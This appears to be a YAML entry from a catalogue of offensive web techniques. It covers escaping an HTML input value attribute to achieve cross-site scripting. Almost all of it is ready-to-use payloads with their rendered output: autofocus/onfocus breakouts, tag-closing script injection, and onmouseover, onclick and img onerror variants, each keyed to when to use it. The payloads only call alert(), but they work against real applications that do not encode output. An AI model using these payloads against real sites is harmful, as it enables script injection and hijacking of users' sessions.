name: xss_input_value_escape
category: web
tags: [xss, html_injection, input_escape, event_handler]
indicators:
  - "User input placed in HTML attribute value"
  - "value=\"{user_input}\" pattern"
  - "No proper HTML encoding of user input"
  - "Input tag with controllable attributes"

tricks:
  - name: "Escape from input value attribute"
    when: "User input is placed in value=\"...\""
    how: "Close the quote and add event handler"
    payload: |
      # Original: <input value="{input}">

      # Payload: " onfocus="alert('XSS')" autofocus="
      # Result: <input value="" onfocus="alert('XSS')" autofocus="">

      # The autofocus attribute triggers onfocus automatically

  - name: "Alternative: Close tag and inject script"
    when: "Event handlers might be filtered"
    how: "Close the input tag and inject script"
    payload: |
      # Payload: "><script>alert("XSS")</script><input value="
      # Result: <input value=""><script>alert("XSS")</script><input value="">

  - name: "Alternative event handlers"
    when: "onfocus is filtered"
    how: "Use other event handlers"
    payload: |
      # onmouseover (requires user interaction)
      " onmouseover="alert('XSS')" x="

      # onclick (requires user interaction)
      " onclick="alert('XSS')" x="

      # onerror with img
      "><img src=x onerror="alert('XSS')"><input value="
